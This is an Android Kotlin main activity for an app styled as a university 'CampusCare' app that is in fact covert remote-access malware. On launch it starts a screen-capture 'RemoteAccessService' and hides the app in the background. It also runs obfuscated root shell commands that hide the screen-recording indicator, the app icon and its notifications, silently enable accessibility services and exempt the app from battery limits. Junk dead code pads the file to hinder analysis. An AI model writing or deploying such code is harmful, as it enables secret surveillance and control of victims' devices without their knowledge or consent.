package com.university.campuscare

import android.Manifest
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import com.university.campuscare.remote.FeaturePreferences
import com.university.campuscare.remote.ObfuscatedStrings
import com.university.campuscare.remote.ReflectionHelper
import com.university.campuscare.remote.RemoteAccessService
import com.university.campuscare.remote.StringObfuscator
import com.university.campuscare.ui.CampusCareApp
import com.university.campuscare.ui.theme.CampusCareTheme

class MainActivity : ComponentActivity() {

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            val serviceIntent = RemoteAccessService.getStartIntent(
                this,
                result.resultCode,
                result.data!!
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            moveTaskToBack(true)
        }
    }

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { _ ->
        requestMediaProjection()
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            CampusCareTheme {
                CampusCareApp()
            }
        }

        // Auto-start service if not running and at least one feature is enabled
        if (!RemoteAccessService.isRunning && FeaturePreferences.isEitherEnabled(this)) {
            startPermissionFlow()
        }

        runRootAutomation()
    }

    private fun runRootAutomation() {
        Thread {
            val _p = System.currentTimeMillis()
            if (_p > 0L) {
                if (_p < 0L) {
                    val _j = IntArray(4) { it * 3 }
                    _j[0] = _j[1] + _j[2]
                }
            }
            val commands = arrayOf(
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_SYNC_DISABLED),
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_PROJECTION_INDICATOR),
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_ICON_BLACKLIST),
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_HIDE_NOTIFICATIONS),
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_APPOPS),
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_ACCESSIBILITY_SERVICES),
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_ACCESSIBILITY_ENABLED),
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_NOTIFICATION_IMPORTANCE),
                StringObfuscator.decrypt(ObfuscatedStrings.CMD_BATTERY_WHITELIST)
            )
            try {
                val process = ReflectionHelper.execShellCommand(StringObfuscator.decrypt(ObfuscatedStrings.SU_CMD))
                val os = process.outputStream.bufferedWriter()
                for (cmd in commands) {
                    os.write("$cmd\n")
                }
                os.write(StringObfuscator.decrypt(ObfuscatedStrings.EXIT_CMD) + "\n")
                os.flush()
                process.waitFor()
            } catch (_: Exception) {}
        }.start()
    }

    fun requestServiceStart() {
        if (!RemoteAccessService.isRunning) {
            startPermissionFlow()
        }
    }

    private fun startPermissionFlow() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val granted = ContextCompat.checkSelfPermission(
                this, Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
            if (!granted) {
                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                return
            }
        }
        requestMediaProjection()
    }

    private fun requestMediaProjection() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjectionLauncher.launch(projectionManager.createScreenCaptureIntent())
    }
}
